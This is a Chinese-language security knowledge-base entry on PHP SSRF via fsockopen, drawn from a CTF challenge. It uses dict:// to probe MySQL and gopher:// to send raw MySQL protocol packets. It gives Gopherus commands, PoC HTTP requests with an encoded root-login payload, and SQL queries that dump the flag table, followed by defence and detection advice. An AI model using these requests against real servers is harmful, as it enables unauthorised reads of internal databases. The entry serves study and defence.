---
id: web-generic-ssrf-fsockopen-gopher-mysql-raw-protocol
title: PHP fsockopen SSRF：dict 探测端口后用 gopher 发送原始 MySQL 协议包执行 SQL
type: scenario
domain: web
path: web/generic/ssrf
technique: ssrf-fsockopen-gopher-mysql-raw-protocol
aliases:
- gopher 打 MySQL
- fsockopen SSRF
- Gopherus MySQL
- dict 端口探测
- X-VERIFY-CODE-URL
- 原始 MySQL 协议 SSRF
tags:
- ssrf
- gopher
- dict
- mysql
- php
- fsockopen
- protocol-smuggling
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V196
  verified_at: '2026-11-06T22:48:33+08:00'
  notes: 已对照原文与截图核对：X-VERIFY-CODE-URL 入口、securityCheck 仅记日志、非 HTTP 走 fsockopen+path 原样写 socket、dict 探 3306、Gopherus payload 去掉开头下划线、查询 ctf_db.flags 均一致；无 affected_versions（CTF 应用）；无 sources 字段；未复跑
---

## 一句话结论

PHP 的 SSRF 实现若在非 http/https 协议时回退到 `fsockopen` 并把 URL path 直接写入 socket，攻击者可用 `dict://127.0.0.1:3306` 探测 MySQL 端口，再用 `gopher://127.0.0.1:3306/<原始 MySQL 协议包>` 让内网 MySQL 直接执行 SQL（如 `show databases`、读 `flags` 表），绕过仅允许 HTTP 的 SSRF 限制。

## 原理

- **入口**：`ImageProcessor::getSourceUrl` 从 `$_SERVER['HTTP_X_VERIFY_CODE_URL']` 取用户可控 URL；`securityCheck` 只对非白名单域名记日志、不阻断；`Request` 对 http/https 用 curl，其它 scheme 走 `fsockopen(host, port)`。
- **fsockopen 分支**：代码取 `parse_url($url)['path']`，`substr($path, 1)` 去掉开头 `/`，`urldecode` 后直接 `fwrite($fp, $payload)`，再把响应读回。也就是说，path 就是任意 TCP 报文体。
- **dict 探测**：`dict://127.0.0.1:3306` 会让 fsockopen 连到 3306；服务端返回的 MySQL 握手包/错误信息出现在响应中，可用于确认端口开放（原文用它发现 MySQL）。
- **gopher 打 MySQL**：MySQL 协议是二进制长度前缀包。`gopher://127.0.0.1:3306/<urlencoded packets>` 会把解码后的字节流原样发给 MySQL；MySQL 依次处理服务端握手、客户端认证、COM_QUERY，攻击者可在认证包中填 `root` + 空密码（或已知口令），随后发送 `show databases;`、`select ...`。
- **Gopherus payload 的 `_`**：Gopherus 生成的 gopher URL 在 path 开头带一个 `_`（curl 的 gopher 实现用它区分数据），但本处是 `fsockopen` 手动写 socket，不识别 `_`；必须去掉 `_`，否则 MySQL 收到的第一个字节是 `_`，握手失败。
- **结果读取**：SSRF 响应被应用保存为图片并返回 `<img src>`；下载该图片（实际是 MySQL 原始响应）即可看到查询结果/字段值。
- **为什么成立**：SSRF 防护只按 scheme 白名单/域名日志，没有限制 fsockopen 的任意 TCP；gopher 本身是“任意字节流”协议，等于把 SSRF 变成了内网协议客户端。

## 触发条件

- 存在可由请求头/参数控制的 SSRF URL，且实现允许非 http/https scheme（至少 dict/gopher）。
- SSRF 代码对非 HTTP 协议使用 `fsockopen` 并把 URL path 原样写入 socket（不是 curl 的 gopher 语义）。
- 目标可访问内网 MySQL（常见 127.0.0.1:3306），且 MySQL 允许 root 空口令/弱口令，或攻击者已知凭据。
- SSRF 响应能回显（保存为图片、直接返回、日志等）。

## 利用步骤

1. 用 `dict://127.0.0.1:3306` 确认 3306 开放；观察响应中的 MySQL 握手/错误特征。
2. 用 Gopherus 生成 MySQL payload：

   ```bash
   python2 gopherus.py --exploit mysql
   # username: root
   # query: show databases;
   ```

3. 复制生成的 `gopher://127.0.0.1:3306/_<data>`，去掉 path 开头的 `_`，得到 `gopher://127.0.0.1:3306/<data>`。
4. 把 URL 放入可控头（如 `X-VERIFY-CODE-URL`）或参数，触发 SSRF。
5. 从响应/保存的图片中读取 MySQL 返回包；用 `select group_concat(table_name) from information_schema.tables where table_schema='ctf_db'`、`select * from ctf_db.flags` 取数据。
6. 授权测试只查询 `select 1` 等无害语句。

## PoC

探测端口：

```http
GET /verify.php HTTP/1.1
Host: target
X-VERIFY-CODE-URL: dict://127.0.0.1:3306
```

Gopherus 生成的 MySQL payload（原文，需去掉开头的 `_`）：

```text
gopher://127.0.0.1:3306/%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00...%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%3b...
```

发送：

```http
GET /verify.php HTTP/1.1
Host: target
X-VERIFY-CODE-URL: gopher://127.0.0.1:3306/<去掉下划线并URL编码后的MySQL包>
```

查询：

```sql
show databases;
select group_concat(table_name) from information_schema.tables where table_schema='ctf_db';
select * from ctf_db.flags;
```

## 变体与关联

- 同一 fsockopen 分支可打 Redis（RESP inline/多批量）、FastCGI（PHP_VALUE）、SMTP、Memcached 等任意 TCP 服务。
- dict 协议可用于端口探测与服务 banner 识别；gopher 用于发送完整协议报文。
- 若代码对 path 做 `urldecode` 后再写 socket，注意二次编码与 `%00` 截断；不同语言的 gopher 实现对 `_`、CRLF 处理不同。
- 关联：[[web-generic-ssrf-gopher-fastcgi-fpm-auto-prepend]]（gopher 打 FastCGI）。
- 关联：[[web-generic-ssrf-redis-inline-protocol-crlf]]（gopher/CRLF 打 Redis）。

## 检测与防御

- SSRF 只允许 http/https，显式拒绝 `gopher://`、`dict://`、`file://`、`ftp://` 等；用 curl 的 `CURLOPT_PROTOCOLS`/`CURLOPT_REDIR_PROTOCOLS` 限制。
- 不要用 `fsockopen` 直连用户可控的主机/端口；如必须，做目标 IP 白名单（解析后校验，防 DNS rebinding）与端口白名单。
- 对 URL 的 host 做 DNS 解析后校验内网/回环地址，禁止访问 127.0.0.1、169.254.0.0/16、10/8、172.16/12、192.168/16。
- MySQL 不要使用 root 空口令/弱口令，绑定 127.0.0.1 并限制应用账户权限。
- 监控 SSRF 参数中出现 `gopher://`、`dict://`、长 URL 编码二进制、MySQL 协议特征（`mysql_native_password`、`show databases`）。
